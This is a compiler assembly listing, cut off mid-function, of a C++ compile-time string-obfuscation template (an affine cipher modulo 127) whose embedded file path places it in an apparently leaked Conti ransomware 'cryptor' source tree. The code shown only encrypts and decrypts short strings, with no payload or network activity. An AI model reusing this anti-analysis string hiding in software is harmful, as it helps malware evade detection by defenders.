_TEXT	SEGMENT
this$ = 224
byte$ = 232
?encrypt@?$MetaBuffer@$0BH@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<23,15,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 74   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 75   :         return (A * byte + B) % 127;

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	6b c0 17	 imul	 eax, eax, 23
  0002d	83 c0 0f	 add	 eax, 15
  00030	99		 cdq
  00031	b9 7f 00 00 00	 mov	 ecx, 127		; 0000007fH
  00036	f7 f9		 idiv	 ecx
  00038	8b c2		 mov	 eax, edx

; 76   :     }

  0003a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00041	5f		 pop	 rdi
  00042	5d		 pop	 rbp
  00043	c3		 ret	 0
?encrypt@?$MetaBuffer@$0BH@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<23,15,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BH@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
i$1 = 8
this$ = 256
?decrypt@?$MetaBuffer@$0BH@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<23,15,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 62   :     {

$LN7:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 63   :         if (!isDecrypted())

  0001f	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00026	e8 00 00 00 00	 call	 ?isDecrypted@?$MetaBuffer@$0BH@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ; MetaBuffer<23,15,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
  0002b	0f b6 c0	 movzx	 eax, al
  0002e	85 c0		 test	 eax, eax
  00030	75 53		 jne	 SHORT $LN5@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00032	48 c7 45 08 00
	00 00 00	 mov	 QWORD PTR i$1[rbp], 0
  0003a	eb 0b		 jmp	 SHORT $LN4@decrypt
$LN2@decrypt:
  0003c	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00040	48 ff c0	 inc	 rax
  00043	48 89 45 08	 mov	 QWORD PTR i$1[rbp], rax
$LN4@decrypt:
  00047	48 83 7d 08 0a	 cmp	 QWORD PTR i$1[rbp], 10
  0004c	73 37		 jae	 SHORT $LN3@decrypt

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0004e	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00052	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00059	48 03 c8	 add	 rcx, rax
  0005c	48 8b c1	 mov	 rax, rcx
  0005f	0f b6 50 01	 movzx	 edx, BYTE PTR [rax+1]
  00063	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0006a	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0BH@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<23,15,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  0006f	48 8b 4d 08	 mov	 rcx, QWORD PTR i$1[rbp]
  00073	48 8b 95 00 01
	00 00		 mov	 rdx, QWORD PTR this$[rbp]
  0007a	48 03 d1	 add	 rdx, rcx
  0007d	48 8b ca	 mov	 rcx, rdx
  00080	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00083	eb b7		 jmp	 SHORT $LN2@decrypt
$LN3@decrypt:
$LN5@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;

  00085	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0008c	48 ff c0	 inc	 rax

; 70   :     }

  0008f	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00096	5f		 pop	 rdi
  00097	5d		 pop	 rbp
  00098	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BH@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<23,15,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0BH@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 224
?isDecrypted@?$MetaBuffer@$0BH@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<23,15,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 57   :     {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 58   :         return m_isDecrypted;

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	0f b6 00	 movzx	 eax, BYTE PTR [rax]

; 59   :     }

  00029	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00030	5f		 pop	 rdi
  00031	5d		 pop	 rbp
  00032	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0BH@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<23,15,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0BH@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
tv168 = 192
this$ = 240
data$ = 248
??0?$MetaBuffer@$0BH@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<23,15,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<23,15,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 50   :     constexpr __forceinline MetaBuffer(const unsigned char* data)

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec f8 00
	00 00		 sub	 rsp, 248		; 000000f8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00024	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0002b	c6 00 00	 mov	 BYTE PTR [rax], 0

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  0002e	b8 01 00 00 00	 mov	 eax, 1
  00033	48 6b c0 00	 imul	 rax, rax, 0
  00037	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0003e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00042	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00049	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BH@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<23,15,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  0004e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00055	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00058	b8 01 00 00 00	 mov	 eax, 1
  0005d	48 6b c0 01	 imul	 rax, rax, 1
  00061	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00068	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0006c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00073	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BH@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<23,15,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  00078	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0007f	88 41 02	 mov	 BYTE PTR [rcx+2], al
  00082	b8 01 00 00 00	 mov	 eax, 1
  00087	48 6b c0 02	 imul	 rax, rax, 2
  0008b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00092	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00096	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0009d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BH@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<23,15,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  000a2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000a9	88 41 03	 mov	 BYTE PTR [rcx+3], al
  000ac	b8 01 00 00 00	 mov	 eax, 1
  000b1	48 6b c0 03	 imul	 rax, rax, 3
  000b5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000bc	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000c0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000c7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BH@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<23,15,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  000cc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000d3	88 41 04	 mov	 BYTE PTR [rcx+4], al
  000d6	b8 01 00 00 00	 mov	 eax, 1
  000db	48 6b c0 04	 imul	 rax, rax, 4
  000df	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000e6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000ea	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000f1	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BH@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<23,15,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  000f6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000fd	88 41 05	 mov	 BYTE PTR [rcx+5], al
  00100	b8 01 00 00 00	 mov	 eax, 1
  00105	48 6b c0 05	 imul	 rax, rax, 5
  00109	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00110	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00114	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0011b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BH@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<23,15,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  00120	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00127	88 41 06	 mov	 BYTE PTR [rcx+6], al
  0012a	b8 01 00 00 00	 mov	 eax, 1
  0012f	48 6b c0 06	 imul	 rax, rax, 6
  00133	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0013a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0013e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00145	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BH@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<23,15,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  0014a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00151	88 41 07	 mov	 BYTE PTR [rcx+7], al
  00154	b8 01 00 00 00	 mov	 eax, 1
  00159	48 6b c0 07	 imul	 rax, rax, 7
  0015d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00164	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00168	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0016f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BH@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<23,15,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  00174	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0017b	88 41 08	 mov	 BYTE PTR [rcx+8], al
  0017e	b8 01 00 00 00	 mov	 eax, 1
  00183	48 6b c0 08	 imul	 rax, rax, 8
  00187	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0018e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00192	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00199	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BH@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<23,15,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  0019e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001a5	88 41 09	 mov	 BYTE PTR [rcx+9], al
  001a8	b8 01 00 00 00	 mov	 eax, 1
  001ad	48 6b c0 09	 imul	 rax, rax, 9
  001b1	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001b8	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001bc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001c3	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BH@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<23,15,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  001c8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001cf	88 41 0a	 mov	 BYTE PTR [rcx+10], al
  001d2	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  001d9	0f b6 40 01	 movzx	 eax, BYTE PTR [rax+1]
  001dd	88 85 c0 00 00
	00		 mov	 BYTE PTR tv168[rbp], al

; 52   :     {
; 53   : 
; 54   :     }

  001e3	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  001ea	48 8d a5 d8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+216]
  001f1	5f		 pop	 rdi
  001f2	5d		 pop	 rbp
  001f3	c3		 ret	 0
??0?$MetaBuffer@$0BH@$0P@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<23,15,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<23,15,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0EP@$0DO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?decrypt@?$MetaBuffer@$0EP@$0DO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@@std@@@@AEBAEE@Z PROC ; MetaBuffer<79,62,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27> >::decrypt, COMDAT

; 79   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	83 e8 3e	 sub	 eax, 62			; 0000003eH
  0002d	6b c0 d3	 imul	 eax, eax, -45		; ffffffffffffffd3H
  00030	ba 7f 00 00 00	 mov	 edx, 127		; 0000007fH
  00035	8b c8		 mov	 ecx, eax
  00037	e8 00 00 00 00	 call	 ?positive_modulo@@YAHHH@Z ; positive_modulo

; 81   :     }

  0003c	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00043	5f		 pop	 rdi
  00044	5d		 pop	 rbp
  00045	c3		 ret	 0
?decrypt@?$MetaBuffer@$0EP@$0DO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<79,62,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0EP@$0DO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?encrypt@?$MetaBuffer@$0EP@$0DO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@@std@@@@AEBAEE@Z PROC ; MetaBuffer<79,62,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27> >::encrypt, COMDAT

; 74   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 75   :         return (A * byte + B) % 127;

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	6b c0 4f	 imul	 eax, eax, 79		; 0000004fH
  0002d	83 c0 3e	 add	 eax, 62			; 0000003eH
  00030	99		 cdq
  00031	b9 7f 00 00 00	 mov	 ecx, 127		; 0000007fH
  00036	f7 f9		 idiv	 ecx
  00038	8b c2		 mov	 eax, edx

; 76   :     }

  0003a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00041	5f		 pop	 rdi
  00042	5d		 pop	 rbp
  00043	c3		 ret	 0
?encrypt@?$MetaBuffer@$0EP@$0DO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<79,62,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27> >::encrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0EP@$0DO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
i$1 = 8
this$ = 256
?decrypt@?$MetaBuffer@$0EP@$0DO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<79,62,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27> >::decrypt, COMDAT

; 62   :     {

$LN7:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 63   :         if (!isDecrypted())

  0001f	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00026	e8 00 00 00 00	 call	 ?isDecrypted@?$MetaBuffer@$0EP@$0DO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@@std@@@@QEBA_NXZ ; MetaBuffer<79,62,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27> >::isDecrypted
  0002b	0f b6 c0	 movzx	 eax, al
  0002e	85 c0		 test	 eax, eax
  00030	75 53		 jne	 SHORT $LN5@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00032	48 c7 45 08 00
	00 00 00	 mov	 QWORD PTR i$1[rbp], 0
  0003a	eb 0b		 jmp	 SHORT $LN4@decrypt
$LN2@decrypt:
  0003c	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00040	48 ff c0	 inc	 rax
  00043	48 89 45 08	 mov	 QWORD PTR i$1[rbp], rax
$LN4@decrypt:
  00047	48 83 7d 08 1c	 cmp	 QWORD PTR i$1[rbp], 28
  0004c	73 37		 jae	 SHORT $LN3@decrypt

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0004e	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00052	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00059	48 03 c8	 add	 rcx, rax
  0005c	48 8b c1	 mov	 rax, rcx
  0005f	0f b6 50 01	 movzx	 edx, BYTE PTR [rax+1]
  00063	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0006a	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0EP@$0DO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@@std@@@@AEBAEE@Z ; MetaBuffer<79,62,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27> >::decrypt
  0006f	48 8b 4d 08	 mov	 rcx, QWORD PTR i$1[rbp]
  00073	48 8b 95 00 01
	00 00		 mov	 rdx, QWORD PTR this$[rbp]
  0007a	48 03 d1	 add	 rdx, rcx
  0007d	48 8b ca	 mov	 rcx, rdx
  00080	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00083	eb b7		 jmp	 SHORT $LN2@decrypt
$LN3@decrypt:
$LN5@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;

  00085	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0008c	48 ff c0	 inc	 rax

; 70   :     }

  0008f	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00096	5f		 pop	 rdi
